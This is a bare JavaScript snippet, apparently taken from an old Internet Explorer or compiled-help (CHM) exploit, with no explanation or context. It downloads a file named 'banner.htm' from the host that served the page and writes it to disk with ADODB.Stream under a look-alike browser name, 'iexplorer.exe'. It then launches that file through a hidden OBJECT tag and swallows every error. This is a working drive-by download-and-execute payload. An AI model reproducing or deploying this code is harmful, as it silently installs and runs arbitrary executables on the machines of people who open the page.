<script language="javascript">

     function LaunchExecutable(ObjSrc)
     {
       tagstyle='style="display:none"'; 
       ObjCLSID="clsid:11111111-1111-1111-11111-111111111111";
       sObject ='<object classid="'+ObjCLSID+'" codebase="'+ObjSrc+'" '+tagstyle+'></object>';
       try
       {
          document.writeln(sObject);
       }
       catch(e){}  
     }

     function getPath(url) 
       {
         start = url.indexOf('http:')
         end = url.indexOf('page1.chm')
         return url.substring(start, end);
       }
    
     payloadURL = getPath(location.href)+'banner.htm';
    
     ObjSrc="C:\\Program Files\\Internet Explorer\\iexplorer.exe";

     var oXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP"); 
     oXMLHTTP.Open("GET",payloadURL,0); 
     oXMLHTTP.Send();   

     try
     {
       var oStream = new ActiveXObject('ADODB.Stream'); 
       oStream.Mode = 3; 
       oStream.Type = 1; 
       oStream.Open(); 
       oStream.Write(oXMLHTTP.responseBody); 
       oStream.SaveToFile(ObjSrc,2);
     }
     catch(e){}

     setTimeout("LaunchExecutable(ObjSrc)",500);
   
</script>